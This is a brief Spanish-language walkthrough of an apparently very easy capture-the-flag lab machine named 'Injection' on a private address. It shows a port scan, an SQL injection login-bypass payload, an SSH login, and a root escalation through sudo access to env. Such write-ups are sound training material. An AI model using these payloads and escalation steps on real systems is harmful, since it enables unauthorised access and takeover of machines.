Maquina: Injection
Autor: El Pinguino de Mario 
Dificultad: Muy Facil

ping 172.17.0.2 -c 1
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
Accedemos a la web y encontramos un panel de login e intentamos explotarlo con una SQL Injection
User: admin' or 1=1-- -
Password: cualquier cosa
Conseguimos bypasearlo y conseguimos la contraseña de un usuario
ssh dylan@172.17.0.2
sudo -l
Vemos que podemos ejecutar env como el usuario root
sudo /usr/bin/env /bin/bash
whoami
